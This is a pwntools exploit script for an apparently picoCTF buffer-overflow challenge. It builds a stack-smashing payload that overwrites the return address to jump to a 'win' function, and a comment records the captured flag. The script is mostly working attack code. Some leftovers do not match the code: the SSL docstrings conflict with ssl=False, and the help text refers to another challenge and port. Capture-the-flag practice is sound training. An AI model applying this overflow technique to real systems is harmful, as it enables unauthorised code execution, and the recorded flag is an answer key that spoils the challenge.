#!/usr/bin/env python3
# exploit.py
# Pwntools template for talking to an SSL remote and sending/receiving raw byte streams.

import argparse
from pwn import *
import struct
import sys

# --- configuration ---
REMOTE_HOST = "saturn.picoctf.net"
REMOTE_PORT = 58434
context.log_level = "debug"   # change to "info" or "error" for less output
# ----------------------

def start_local(path, argv=None):
    """Start a local process (useful for testing)."""
    if argv is None:
        return process(path)
    return process([path] + list(argv))

def start_remote(host=REMOTE_HOST, port=REMOTE_PORT, ssl=True):
    """Connect to the remote service. ssl=True enables TLS (equivalent to ncat --ssl)."""
    return remote(host, port, ssl=ssl)

# ---------- handy wrappers for bytestream I/O ----------
class IO:
    def __init__(self, conn):
        self.conn = conn

    def send_bytes(self, b: bytes):
        """Send raw bytes (no newline)."""
        if not isinstance(b, (bytes, bytearray)):
            raise TypeError("send_bytes expects bytes")
        log.info(f"Sending {len(b)} bytes")
        self.conn.send(b)

    def sendline_bytes(self, b: bytes):
        """Send raw bytes + newline."""
        if not isinstance(b, (bytes, bytearray)):
            raise TypeError("sendline_bytes expects bytes")
        self.conn.sendline(b)

    def recv_any(self, timeout=2):
        """Receive whatever is available (may be partial)."""
        res = self.conn.recv(timeout=timeout)
        log.info(f"Received {len(res)} bytes (any)")
        return res

    def recvn(self, n, timeout=5):
        """Receive exactly n bytes (blocks until n bytes or timeout)."""
        # pwntools has recvn built-in
        res = self.conn.recvn(n, timeout=timeout)
        if res is None:
            raise EOFError(f"Expected {n} bytes, got nothing (timeout {timeout})")
        if len(res) < n:
            log.warning(f"Short read: expected {n}, got {len(res)}")
        else:
            log.info(f"Received {len(res)} bytes (exact)")
        return res

    def recvuntil(self, delim: bytes = b"\n", timeout=5, drop=False):
        """Receive until delimiter. delim must be bytes."""
        if not isinstance(delim, (bytes, bytearray)):
            raise TypeError("delim must be bytes")
        res = self.conn.recvuntil(delim, timeout=timeout, drop=drop)
        log.info(f"Received until {delim!r}: {len(res)} bytes")
        return res

    def send_and_recv(self, to_send: bytes, read_until: bytes = b"\n", timeout=5):
        """Send bytes then read until a delimiter (useful for request/response)."""
        self.send_bytes(to_send)
        return self.recvuntil(read_until, timeout=timeout)

    def interactive(self):
        """Drop to interactive mode (handy after initial protocol work)."""
        self.conn.interactive()

# ---------- packing helpers ----------
def p64le(x): return struct.pack("<Q", x)
def u64le(b): return struct.unpack("<Q", b)[0]
def p32le(x): return struct.pack("<I", x)
def u32le(b): return struct.unpack("<I", b)[0]

# ---------- example exploit flow ----------
def exploit(conn: remote):
    io = IO(conn)

    payload = b''
    # 4 alignement bytes (so stack is divisible by 16)
    payload += b"A" * 4
    # Buffer size
    payload += b"A" * 32
    # saved EBX (callee-saved reg)
    payload += b"\x00\x00\x00\x00"
    # Saved RBP (4 bytes)
    payload += b"\x00\x00\x00\x00"
    # Return address of win func
    payload += p32le(0x080491f6)
    # Add newline
    payload += b"\n"

    # Okay, time to return... Fingers Crossed... Jumping to 0x804932f
    # [DEBUG] Received 0x24 bytes:
    # b'picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}'

    # Example: send a raw bytestream (binary payload)
    # payload = b"HELLO" + b"\x00\x01\x02\x03" + p64le(0x4142434445464748)
    # io.send_bytes(payload)
    # p.sendlineafter("Enter your birthdate (mm/dd/yyyy): ", b'1/1/1')
    # print(p.recvline())

    # Parse response
    response = io.recv_any(timeout=3)
    # response = io.recvuntil(b"\n", timeout=3)
    print(f"Response: {response}")

    io.send_bytes(payload)

    io.interactive()


# ---------- CLI / entrypoint ----------
def main():
    parser = argparse.ArgumentParser(description="pwntools SSL template for character-assassination")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--remote", action="store_true", help="Connect to remote SSL service")
    group.add_argument("--local", metavar="BINARY", help="Run a local binary for testing")
    parser.add_argument("--port", type=int, default=REMOTE_PORT, help="remote port (default 1337)")
    parser.add_argument("--host", default=REMOTE_HOST, help="remote host (default character-assassination...)")
    args = parser.parse_args()

    try:
        if args.remote:
            log.info(f"Connecting to {args.host}:{args.port} with SSL")
            conn = start_remote(host=args.host, port=args.port, ssl=False)
        else:
            log.info(f"Starting local binary: {args.local}")
            conn = start_local(args.local)

        exploit(conn)

    except Exception as e:
        log.exception("Exception during exploit")
        try:
            conn.close()
        except:
            pass
        sys.exit(1)

if __name__ == "__main__":
    main()
